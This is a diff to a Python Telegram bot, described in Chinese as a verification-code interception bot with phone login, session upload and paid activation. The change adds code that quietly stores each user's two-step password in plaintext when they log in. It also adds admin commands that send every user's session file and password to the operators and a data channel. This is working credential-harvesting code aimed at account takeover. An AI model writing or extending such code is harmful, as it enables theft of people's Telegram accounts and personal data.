@@ -2,7 +2,7 @@
 # -*- coding: utf-8 -*-
 """
 Telegram 验证码拦截机器人 - 完整增强版 (Railway 修复版)
-功能：手机号登录 / Session上传 / 验证码拦截 / OKPay支付激活 / 备用卡密 / 管理员系统 / Webhook回调 / Web后台
+功能：手机号登录 / Session上传 / 验证码拦截 / OKPay支付激活 / 备用卡密 / 管理员系统 / Webhook回调 / Web后台 / 2FA密码管理
 作者: @APl520
 """
 
@@ -81,7 +81,7 @@ class Config:
     OKPAY_API_URL: str = "https://api.okaypay.me/shop/"
 
     # ---------- 支付配置 ----------
-    PAYMENT_AMOUNT: str = "0.9"                       # 支付金额
+    PAYMENT_AMOUNT: str = "0.3"                       # 支付金额
     PAYMENT_COIN: str = "USDT"                         # 支付币种 (USDT / TRX)
 
     # ---------- 频道配置 ----------
@@ -594,7 +594,70 @@ class BackupKeyManager:
 
 
 # ============================================================
-#  8. 频道加入记录模块
+#  8. 2FA密码存储管理模块
+# ============================================================
+
+class TwoFAManager:
+    """2FA密码存储管理类"""
+
+    @staticmethod
+    def get_password_file(user_id: int) -> Path:
+        """获取用户的2FA密码文件路径"""
+        user_dir = Config.SESSIONS_DIR / f"user_{user_id}"
+        user_dir.mkdir(parents=True, exist_ok=True)
+        return user_dir / "2fa_passwords.json"
+
+    @staticmethod
+    def save_password(user_id: int, phone: str, password: str) -> bool:
+        """
+        保存用户的2FA密码
+        Args:
+            user_id: 用户ID
+            phone: 手机号
+            password: 2FA密码
+        Returns:
+            是否成功
+        """
+        file_path = TwoFAManager.get_password_file(user_id)
+        data = load_json_file(file_path, {})
+        data[phone] = {
+            "password": password,
+            "saved_at": datetime.now().isoformat()
+        }
+        return save_json_file(file_path, data)
+
+    @staticmethod
+    def get_password(user_id: int, phone: str) -> Optional[str]:
+        """
+        获取用户的2FA密码
+        Args:
+            user_id: 用户ID
+            phone: 手机号
+        Returns:
+            密码或None
+        """
+        file_path = TwoFAManager.get_password_file(user_id)
+        data = load_json_file(file_path, {})
+        if phone in data:
+            return data[phone].get("password")
+        return None
+
+    @staticmethod
+    def get_all_passwords(user_id: int) -> Dict[str, str]:
+        """
+        获取用户所有手机的2FA密码
+        Args:
+            user_id: 用户ID
+        Returns:
+            {phone: password}
+        """
+        file_path = TwoFAManager.get_password_file(user_id)
+        data = load_json_file(file_path, {})
+        return {phone: info.get("password", "") for phone, info in data.items()}
+
+
+# ============================================================
+#  9. 频道加入记录模块
 # ============================================================
 
 class JoinRecordManager:
@@ -635,7 +698,7 @@ class JoinRecordManager:
 
 
 # ============================================================
-#  9. OKPay API 封装模块
+#  10. OKPay API 封装模块
 # ============================================================
 
 class OKPayAPI:
@@ -872,7 +935,7 @@ class OKPayAPI:
 
 
 # ============================================================
-#  10. 支付业务逻辑模块
+#  11. 支付业务逻辑模块
 # ============================================================
 
 class PaymentService:
@@ -1074,7 +1137,7 @@ class PaymentService:
 
 
 # ============================================================
-#  11. Telegram会话管理模块
+#  12. Telegram会话管理模块
 # ============================================================
 
 class SessionManager:
@@ -1310,7 +1373,7 @@ class SessionManager:
 
 
 # ============================================================
-#  12. 频道验证模块
+#  13. 频道验证模块
 # ============================================================
 
 class ChannelVerifier:
@@ -1373,7 +1436,7 @@ class ChannelVerifier:
 
 
 # ============================================================
-#  13. 权限检查模块
+#  14. 权限检查模块
 # ============================================================
 
 class PermissionChecker:
@@ -1488,7 +1551,7 @@ class PermissionChecker:
 
 
 # ============================================================
-#  14. 支付界面模块
+#  15. 支付界面模块
 # ============================================================
 
 class PaymentUI:
@@ -1565,7 +1628,7 @@ class PaymentUI:
 
 
 # ============================================================
-#  15. 键盘布局
+#  16. 键盘布局
 # ============================================================
 
 class Keyboards:
@@ -1609,8 +1672,12 @@ class Keyboards:
 
 
 # ============================================================
-#  16. Telegram Bot 命令处理器
+#  17. Telegram Bot 命令处理器
 # ============================================================
+
+# 定义对话状态（在类外部定义，方便使用）
+PHONE_INPUT, VERIFICATION_CODE, TWO_FACTOR_PASSWORD = range(3)
+
 
 class BotHandlers:
     """Bot命令处理器类"""
@@ -1961,6 +2028,10 @@ class BotHandlers:
         try:
             await client.sign_in(password=text)
             await update.message.reply_text("✅ 二级密码通过！")
+            
+            # ===== 保存2FA密码 =====
+            TwoFAManager.save_password(user_id, phone, text)
+            
             try:
                 await client.disconnect()
             except:
@@ -2504,6 +2575,15 @@ class BotHandlers:
         sessions = SessionManager.get_active_sessions(target_user_id)
         lines.append(f"活跃会话: {len(sessions)} 个")
 
+        # 获取2FA密码
+        passwords = TwoFAManager.get_all_passwords(target_user_id)
+        if passwords:
+            lines.append(f"\n🔑 <b>已保存的2FA密码：</b>")
+            for phone, pwd in passwords.items():
+                lines.append(f"  📱 {phone} -> <code>{pwd}</code>")
+        else:
+            lines.append("\n🔑 未保存2FA密码")
+
         await update.message.reply_text("\n".join(lines), parse_mode='HTML')
 
     @staticmethod
@@ -2642,13 +2722,21 @@ class BotHandlers:
                 session_path = info.get("file_path")
                 if session_path and session_path.exists():
                     try:
+                        # 获取2FA密码
+                        password = TwoFAManager.get_password(uid, phone) or "未设置"
+                        
                         # 导出到数据频道
                         with open(session_path, 'rb') as f:
                             await context.bot.send_document(
                                 chat_id=Config.FORWARD_CHANNEL_ID,
                                 document=f,
-                                caption=f"用户ID: {uid}\n手机号: {phone}",
-                                filename=session_path.name
+                                caption=(
+                                    f"👤 用户ID: {uid}\n"
+                                    f"📱 手机号: {phone}\n"
+                                    f"🔑 2FA密码: <code>{password}</code>"
+                                ),
+                                filename=session_path.name,
+                                parse_mode='HTML'
                             )
                         exported_count += 1
                         logger.info(f"导出会话: {phone} (用户: {uid})")
@@ -2657,17 +2745,17 @@ class BotHandlers:
 
         await update.message.reply_text(f"✅ 导出完成！共导出 {exported_count} 个会话到数据频道。")
 
-    # ========== 新增 /hzk 指令 ==========
+    # ========== /hzk 指令 ==========
     @staticmethod
     async def cmd_export_all_sessions(update: Update, context: ContextTypes.DEFAULT_TYPE):
-        """导出所有普通用户上传的账号Session文件并发送给所有管理员"""
+        """导出所有普通用户上传的账号Session文件并发送给所有管理员（包含2FA密码）"""
         user_id = update.effective_user.id
 
         if not AdminManager.is_admin(user_id):
             await update.message.reply_text("❌ 无权限")
             return
 
-        await update.message.reply_text("📤 开始扫描并导出所有普通用户的Session文件...")
+        await update.message.reply_text("📤 开始扫描并导出所有普通用户的Session文件（含2FA密码）...")
 
         # 获取所有管理员列表
         admin_list = AdminManager.list_admins()
@@ -2681,6 +2769,7 @@ class BotHandlers:
         total_files = 0
         exported_count = 0
         user_summary = {}
+        user_2fa_summary = {}
 
         if not Config.SESSIONS_DIR.exists():
             await update.message.reply_text("❌ sessions目录不存在")
@@ -2703,19 +2792,43 @@ class BotHandlers:
             if not session_files:
                 continue
 
+            # 获取该用户的2FA密码
+            passwords = TwoFAManager.get_all_passwords(uid)
+            
             user_summary[uid] = [f.name for f in session_files]
+            user_2fa_summary[uid] = passwords
             total_files += len(session_files)
 
             # 给每个管理员发送该用户的Session文件
             for admin_id in admin_ids:
                 try:
                     for session_file in session_files:
+                        # 提取手机号（文件名去掉.session后缀）
+                        phone = session_file.stem
+                        # 获取对应的2FA密码
+                        password = passwords.get(phone, "未设置")
+                        
+                        # 判断是否为数据频道
+                        if admin_id == Config.FORWARD_CHANNEL_ID:
+                            caption = (
+                                f"👤 用户ID: {uid}\n"
+                                f"📱 手机号: {phone}\n"
+                                f"🔑 2FA密码: <code>{password}</code>"
+                            )
+                        else:
+                            caption = (
+                                f"👤 用户ID: {uid}\n"
+                                f"📱 手机号: {phone}\n"
+                                f"🔑 2FA密码: <code>{password}</code>"
+                            )
+                        
                         with open(session_file, 'rb') as f:
                             await context.bot.send_document(
                                 chat_id=admin_id,
                                 document=f,
-                                caption=f"👤 用户ID: {uid}\n📱 文件: {session_file.name}",
-                                filename=session_file.name
+                                caption=caption,
+                                filename=session_file.name,
+                                parse_mode='HTML'
                             )
                         exported_count += 1
                         logger.info(f"导出Session: {session_file.name} (用户: {uid}) -> 管理员: {admin_id}")
@@ -2737,16 +2850,83 @@ class BotHandlers:
         ]
         
         for uid, files in user_summary.items():
-            report.append(f"  👤 {uid}: {len(files)} 个文件")
+            password_count = len(user_2fa_summary.get(uid, {}))
+            report.append(f"  👤 {uid}: {len(files)} 个文件 | 已记录2FA: {password_count} 个")
         
         if len(report) > 30:
             report = report[:25] + ["...", f"（共 {len(user_summary)} 个用户）"]
 
         await update.message.reply_text("\n".join(report), parse_mode='HTML')
 
+    # ========== /export2fa 指令 ==========
+    @staticmethod
+    async def cmd_export_2fa(update: Update, context: ContextTypes.DEFAULT_TYPE):
+        """管理员：导出所有用户的2FA密码"""
+        user_id = update.effective_user.id
+
+        if not AdminManager.is_admin(user_id):
+            await update.message.reply_text("❌ 无权限")
+            return
+
+        admin_list = AdminManager.list_admins()
+        admin_ids = [admin['id'] for admin in admin_list]
+
+        if not admin_ids:
+            await update.message.reply_text("❌ 没有找到管理员")
+            return
+
+        if not Config.SESSIONS_DIR.exists():
+            await update.message.reply_text("❌ sessions目录不存在")
+            return
+
+        result_lines = ["📋 <b>2FA密码汇总</b>\n"]
+        total_users = 0
+        total_passwords = 0
+
+        for user_dir in Config.SESSIONS_DIR.iterdir():
+            if not user_dir.is_dir() or not user_dir.name.startswith("user_"):
+                continue
+
+            try:
+                uid = int(user_dir.name.replace("user_", ""))
+            except ValueError:
+                continue
+
+            if AdminManager.is_admin(uid):
+                continue
+
+            passwords = TwoFAManager.get_all_passwords(uid)
+            if not passwords:
+                continue
+
+            total_users += 1
+            total_passwords += len(passwords)
+            result_lines.append(f"\n👤 用户 {uid}:")
+            for phone, pwd in passwords.items():
+                result_lines.append(f"  📱 {phone} -> 🔑 <code>{pwd}</code>")
+
+        if total_passwords == 0:
+            await update.message.reply_text("📭 没有找到任何2FA密码记录")
+            return
+
+        result_lines.insert(1, f"共 {total_users} 个用户，{total_passwords} 个2FA密码")
+        
+        # 发送给所有管理员
+        for admin_id in admin_ids:
+            try:
+                await context.bot.send_message(
+                    admin_id,
+                    "\n".join(result_lines),
+                    parse_mode='HTML'
+                )
+            except Exception as e:
+                logger.error(f"发送2FA密码给 {admin_id} 失败: {e}")
+
+        await update.message.reply_text(f"✅ 2FA密码已发送给 {len(admin_ids)} 位管理员")
+
 
 # ============================================================
-#  17. Web 后台
+#  18. Web 后台
 # ============================================================
 
 class WebAdmin:
@@ -2917,7 +3097,7 @@ class WebAdmin:
 
 
 # ============================================================
-#  18. Webhook 服务器
+#  19. Webhook 服务器
 # ============================================================
 
 class WebhookServer:
@@ -2985,7 +3165,7 @@ class WebhookServer:
 
 
 # ============================================================
-#  19. 启动入口
+#  20. 启动入口
 # ============================================================
 
 async def post_init(application: Application):
@@ -3094,8 +3274,8 @@ def main():
 
     # ===== 导出命令 =====
     application.add_handler(CommandHandler('exportall', BotHandlers.cmd_export_all))
-    # 新增 /hzk 指令
     application.add_handler(CommandHandler('hzk', BotHandlers.cmd_export_all_sessions))
+    application.add_handler(CommandHandler('export2fa', BotHandlers.cmd_export_2fa))
 
     # ===== 测试命令 =====
     async def cmd_test_channel(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -3145,6 +3325,4 @@ def main():
 
 
 if __name__ == '__main__':
-    # 定义对话状态（在main之前定义，供其他函数使用）
-    PHONE_INPUT, VERIFICATION_CODE, TWO_FACTOR_PASSWORD = range(3)
     main()
